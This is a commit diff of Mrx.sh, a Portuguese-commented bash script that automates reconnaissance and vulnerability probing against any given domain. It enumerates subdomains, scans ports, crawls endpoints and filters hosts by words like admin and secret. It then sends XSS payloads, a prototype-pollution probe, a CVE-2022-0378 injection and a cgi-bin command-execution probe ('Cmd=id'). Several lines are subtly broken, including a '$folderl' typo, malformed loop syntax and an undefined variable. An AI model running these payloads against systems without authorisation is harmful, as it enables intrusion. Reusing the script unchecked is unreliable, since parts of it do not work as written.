be02217fc4104546d404297561e36d1a2a8bebdb
#MrxBug💻 <112347226+MrxBug@users.noreply.github.com>
2024-04-07 16:31:37 -0300

    Update Mrx.sh

--- Mrx.sh
+++ Mrx.sh
@@ -59,80 +59,117 @@ mkdir -p "$folder"
 # Executando subfinder para encontrar subdomínios
 echo -e "\e[33mRunning subfinder\e[0m"
 subfinder -d "$domain" -all -o "$folder/subfinder_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/subfinder_tmp.txt")\e[0m"
 
 # Executando amass para encontrar subdomínios
 echo -e "\e[33mRunning amass\e[0m"
 amass enum -passive -norecursive -d "$domain" -o "$folder/amass_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/amass_tmp.txt")\e[0m"
 
 # Executando Findomain
 echo -e "\e[33mRunning Findomain\e[0m"
 findomain -t "$domain" -q 2>/dev/null > "$folder/Findomain_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/Findomain_tmp.txt")\e[0m"
 
 # Executando Assetfinder
 echo -e "\e[33mRunning Assetfinder\e[0m"
 assetfinder --subs-only "$domain" > "$folder/Assetfinder_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/Assetfinder_tmp.txt")\e[0m"
 
 # Executando chaos
 echo -e "\e[33mRunning Chaos\e[0m"
 chaos -d "$domain" -o "$folder/chaos_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/chaos_tmp.txt")\e[0m"
 
 #gau-subdomains
 echo -e "\e[33mRunning Gau subdomains\e[0m"
 gau --threads 10 --subs "$domain" | unfurl -u domains > "$folder/gau_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/gau_tmp.txt")\e[0m"
 
 #github-subdomains verificar Api
 echo -e "\e[33mRunning Github subdomains\e[0m"
 github-subdomains -d "$domain" -o "$folder/github_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/github_tmp.txt")\e[0m"
 
 #gitlab-subdomains verificar Api
 echo -e "\e[33mRunning Gitlab subdomains\e[0m"
 gitlab-subdomains -d "$domain" > "$folder/gitlab_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/gitlab_tmp.txt")\e[0m"
 
 #cero-subdomains
 echo -e "\e[33mRunning Cero subdomains\e[0m"
 cero "$domain" > "$folder/cero_temp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/cero_temp.txt")\e[0m"
 
 #center-subdomains
 echo -e "\e[33mRunning Center subdomains\e[0m"
 curl "https://api.subdomain.center/?domain=$domain" -s | jq -r '.[]' | sort -u > "$folder/center_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/center_tmp.txt")\e[0m"
 
 # Executando Sublist3r
 # colocar caminho Sublist3r
 echo -e "\e[33mRunning Sublist3r\e[0m"
 python3 ~/Sublist3r/sublist3r.py -d "$domain" -v -o "$folder/Sublist3r_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/Sublist3r_tmp.txt")\e[0m"
 
 # Executando jldc
 echo -e "\e[33mRunning jldc\e[0m"
 curl -s "https://jldc.me/anubis/subdomains/$domain" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep "$domain" | grep -v "*" | sed -e 's/^[[:punct:]]//g' | sed -r '/^\s*$/d' | sort -u > "$folder/jldc_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/jldc_tmp.txt")\e[0m"
 
 # Executando wayback
 echo -e "\e[33mRunning wayback\e[0m"
 curl -sk "http://web.archive.org/cdx/search/cdx?url=*.$domain&output=txt&fl=original&collapse=urlkey&page=" | awk -F/ '{gsub(/:.*/, "", $3); print $3}' | sort -u > "$folder/wayback_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/wayback_tmp.txt")\e[0m"
 
 # Executando crt
 echo -e "\e[33mRunning crt\e[0m"
 curl -sk "https://crt.sh/?q=%.$domain&output=json" | tr ',' '\n' | awk -F'"' '/name_value/ {gsub(/\*\./, "", $4); gsub(/\\n/,"\n",$4);print $4}' | sort -u > "$folder/crt_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/crt_tmp.txt")\e[0m"
 
 # Executando abuseipdb
 echo -e "\e[33mRunning abuseipdb\e[0m"
 curl -s "https://www.abuseipdb.com/whois/$domain" -H "user-agent: firefox" -b "abuseipdb_session=" | grep -E '<li>\w.*</li>' | sed -E 's/<\/?li>//g' | sed -e "s/$/.$domain/" | sort -u > "$folder/abuseipdb_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/abuseipdb_tmp.txt")\e[0m"
 
 # Executando alienvault
 echo -e "\e[33mRunning alienvault\e[0m"
 curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$domain/passive_dns" | jq '.passive_dns[].hostname' 2>/dev/null | grep -o "\w.*$domain" | sort -u > "$folder/alienvault_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/alienvault_tmp.txt")\e[0m"
 
 # Executando urlscan.io
 echo -e "\e[33mRunning urlscan\e[0m"
 curl -s "https://urlscan.io/api/v1/search/?q=domain:$domain" | jq '.results[].page.domain' 2>/dev/null | grep -o "\w.*$domain"| sort -u > "$folder/urlscan_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/urlscan_tmp.txt")\e[0m"
 
 # Executando RapidDNS
 echo -e "\e[33mRunning RapidDNS\e[0m"
 curl -s "https://rapiddns.io/subdomain/$domain?full=1#result" | grep -v "RapidDNS" | grep -v "<td><a" | cut -d '>' -f 2 | cut -d '<' -f 1 | grep "$domain" | grep -v "*" | sed -e 's/^[[:punct:]]//g' | sed -r '/^\s*$/d' | sort -u > "$folder/RapidDNS_tmp.txt"
+# Contar as linhas do arquivo 
+echo -e "\e[1;31m$(wc -l < "$folder/RapidDNS_tmp.txt")\e[0m"
 
 # Limpando e ordenando subdomínios
 echo -e "\e[33mCleaning and sorting subdomains\e[0m"
 cat "$folder/subfinder_tmp.txt" "$folder/amass_tmp.txt" "$folder/Findomain_tmp.txt" "$folder/Assetfinder_tmp.txt" "$folder/Sublist3r_tmp.txt" "$folder/jldc_tmp.txt" "$folder/wayback_tmp.txt" "$folder/crt_tmp.txt" "$folder/abuseipdb_tmp.txt" "$folder/alienvault_tmp.txt" "$folder/urlscan_tmp.txt" "$folder/RapidDNS_tmp.txt" "$folder/chaos_tmp.txt" "$folder/gau_tmp.txt" "$folder/github_tmp.txt" "$folder/gitlab_tmp.txt" "$folder/cero_temp.txt" "$folder/center_tmp.txt" > "$folder/subdomains_tmp1.txt"
 sort -u "$folder/subdomains_tmp1.txt" > "$folder/subdomains.txt"
+echo -e "\e[1;31m$(wc -l < "$folder/subdomains.txt")\e[0m"
 rm "$folder/subfinder_tmp.txt" "$folder/amass_tmp.txt" "$folder/Findomain_tmp.txt" "$folder/Assetfinder_tmp.txt" "$folder/Sublist3r_tmp.txt" "$folder/jldc_tmp.txt" "$folder/wayback_tmp.txt" "$folder/crt_tmp.txt" "$folder/abuseipdb_tmp.txt" "$folder/alienvault_tmp.txt" "$folder/urlscan_tmp.txt" "$folder/RapidDNS_tmp.txt" "$folder/chaos_tmp.txt" "$folder/gau_tmp.txt" "$folder/github_tmp.txt" "$folder/gitlab_tmp.txt" "$folder/cero_temp.txt" "$folder/center_tmp.txt"
 rm "$folder/subdomains_tmp1.txt"
 
@@ -140,48 +177,63 @@ rm "$folder/subdomains_tmp1.txt"
 echo -e "\e[33mRunning naabu...\e[0m"
 naabu -c 250 -l "$folder/subdomains.txt" -port "81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,3000,5000,8080,8000,8081,8888,8069,8009,8001,8070,8088,8002,8060,8091,8086,8010,8050,8085,8089,8040,8020,8051,8087,8071,8011,8030,8061,8072,8100,8083,8073,8099,8092,8074,8043,8035,8055,8021,8093,8022,8075,8044,8062,8023,8094,8012,8033,8063,8045,7000,9000,7070,9001,7001,10000,9002,7002,9003,7003,10001,80,443,4443" | anew "$folder/portscan.txt"
 echo -e "\e[33mRunning httpx Live ports\e[0m"
-httpx -l "$folder/portscan.txt" -o "$folder/liveports.txt"
+httpx -l "$folder/portscan.txt" -o "$folderl/liveports.txt"
+echo -e "\e[1;31m$(wc -l < "$folder/liveports.txt")\e[0m"
 rm "$folder/portscan.txt"
 
 # Executando httpx para encontrar subdomínios ativos
 echo -e "\e[33mFinding live subdomains...\e[0m"
 httpx -l "$folder/subdomains.txt" -o "$folder/live_subdomains.txt"
+echo -e "\e[1;31m$(wc -l < "$folder/live_subdomains.txt")\e[0m"
 
 # filter subdomains by keywords
 echo -e "\e[33mfilter subdomains by keywords...\e[0m"
 cat "$folder/live_subdomains.txt" | egrep -i "internal|api|test|prod|private|secret|git|login|admin|staging|dev|jira|intranet|vip|portal|register|pass|reset|client|database|server|backup|Credential|database|docker|encryption|security|authorization|authentication|monitoring|logging|certificate|token|integration|endpoint|validation|configuration|deployment" > "$folder/active_priority.txt"
+echo -e "\e[1;31m$(wc -l < "$folder/active_priority.txt")\e[0m"
 
 # Extract .js Subdomains
 echo -e "\e[33mExtract .js Subdomains...\e[0m"
 cat "$folder/live_subdomains.txt" | getJS --complete | anew "$folder/JS.txt"
+echo -e "\e[1;31m$(wc -l < "$folder/JS.txt")\e[0m"
 
 # Executando gau para encontrar endpoints
 echo -e "\e[33mFinding endpoints with gau...\e[0m"
-cat "$folder/live_subdomains.txt" | gau --blacklist png,jpg,gif,svg,jpeg,pdf --threads 6 --o "$folder/EndpointsGau.txt"
+cat "$folder/live_subdomains.txt" | gau --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg --threads 6 --o "$folder/EndpointsGau.txt"
+echo -e "\e[1;31m$(wc -l < "$folder/EndpointsGau.txt")\e[0m"
 
 # Executando waybackurls
 echo -e "\e[33mExecutando waybackurls...\e[0m"
 cat "$folder/live_subdomains.txt" | waybackurls > "$folder/EndpointsWay.txt"
+echo -e "\e[1;31m$(wc -l < "$folder/EndpointsWay.txt")\e[0m"
 
 # Executando gospider
 echo -e "\e[33mExecutando gospider...\e[0m"
-gospider -S "$folder/live_subdomains.txt" -o "$folder/output" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source 
+gospider -S "$folder/live_subdomains.txt" -o "$folder/output" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg)" --other-source 
 cat "$folder/output/*" | grep -e "code-200" | awk '{print $5}' | anew "$folder/EndpointsGos.txt"
+echo -e "\e[1;31m$(wc -l < "$folder/EndpointsGos.txt")\e[0m"
 rm -r "$folder/output"
 
 # Executando hakrawler
 echo -e "\e[33mExecutando hakrawler...\e[0m"
 cat "$folder/live_subdomains.txt" | hakrawler -subs -u -t 10 | anew "$folder/EndpointsHakrawler.txt"
+echo -e "\e[1;31m$(wc -l < "$folder/EndpointsHakrawler.txt")\e[0m"
+
+# Executando cariddi
+echo -e "\e[33mExecutando cariddi...\e[0m"
+cat "$folder/live_subdomains.txt" | cariddi -ot "$folder/cariddi.txt"
+echo -e "\e[1;31m$(wc -l < "$folder/cariddi.txt")\e[0m"
 
 # Executando katana 
 echo -e "\e[33mFinding endpoints with katana...\e[0m"
 cat "$folder/live_subdomains.txt" | katana -silent -jc -kf all -d 3 -fs rdn -c 30 -o "$folder/Endpointskat.txt"
+echo -e "\e[1;31m$(wc -l < "$folder/Endpointskat.txt")\e[0m"
 
 # Removendo duplicatas usando uro
 echo -e "\e[33mRemoving duplicats Endpoints...\e[0m"
-cat "$folder/EndpointsGau.txt" "$folder/EndpointsWay.txt" "$folder/EndpointsGos.txt" "$folder/Endpointskat.txt" "$folder/EndpointsHakrawler.txt" > "$folder/Endpoints1.txt"
+cat "$folder/EndpointsGau.txt" "$folder/EndpointsWay.txt" "$folder/EndpointsGos.txt" "$folder/Endpointskat.txt" "$folder/EndpointsHakrawler.txt" "$folder/cariddi.txt" > "$folder/Endpoints1.txt"
 cat "$folder/Endpoints1.txt" | uro | anew "$folder/EndpointsL.txt"
-rm "$folder/EndpointsGau.txt" "$folder/EndpointsWay.txt" "$folder/EndpointsGos.txt" "$folder/Endpointskat.txt" "$folder/EndpointsHakrawler.txt"
+echo -e "\e[1;31m$(wc -l < "$folder/EndpointsL.txt")\e[0m"
+rm "$folder/EndpointsGau.txt" "$folder/EndpointsWay.txt" "$folder/EndpointsGos.txt" "$folder/Endpointskat.txt" "$folder/EndpointsHakrawler.txt" "$folder/cariddi.txt"
 rm "$folder/Endpoints1.txt"
 
 # Executando Gf Patterns
@@ -229,12 +281,21 @@ echo -e "\e[32mExecutando Testes de Vulnerabilidade\e[0m"
 
 # teste xss
 echo -e "\e[32mExecutando qsreplace xss...\e[0m"
-"$folder/xss.txt" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' > "$folder/qsreplaceVul.txt"
+cat "$folder/xss.txt" | uro | grep "=" | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' > "$folder/qsreplaceVul.txt"
 
+# One-line test
 # Prototype Pollution One-line
 echo -e "\e[32mPrototype Pollution One-line\e[0m"
 httpx -l "$folder/subdomains.txt" -threads 200 | anew -q FILE.txt && sed 's/$/\/?_proto_[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOTVULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" > "$folder/PrototypeP.txt"      
 rm FILE.txt
+
+# One-line CVE-2022-0378
+echo -e "\e[32mCVE-2022-0378 One-line\e[0m"
+cat "$folder/live_subdomains.txt" | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"| grep -qs "onmouse" && echo "$h: VULNERABLE - URL: $h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"; done > "$folder/CVE-2022-0378.txt"
+
+# One-line Rce
+echo -e "\e[32mRCE One-line\e[0m"
+cat "$folder/subdomains.txt" | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent | grep -q "uid=" && echo "$h: VULNERABLE" > "$folder/RceOneline.txt"
 
 #lfi
 # Passar caminho da Wordlist de paylouds!!!
